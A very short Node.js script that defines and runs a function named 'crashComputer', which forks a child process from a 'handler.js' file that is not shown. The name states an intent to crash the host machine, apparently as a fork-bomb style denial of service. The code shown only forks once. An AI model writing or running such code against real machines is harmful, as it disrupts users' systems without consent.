// Import the required libraries
import * as child_process from 'child_process';
import * as os from 'os';

function crashComputer() {

  child_process.fork(__dirname + '/handler.js');
}

crashComputer();
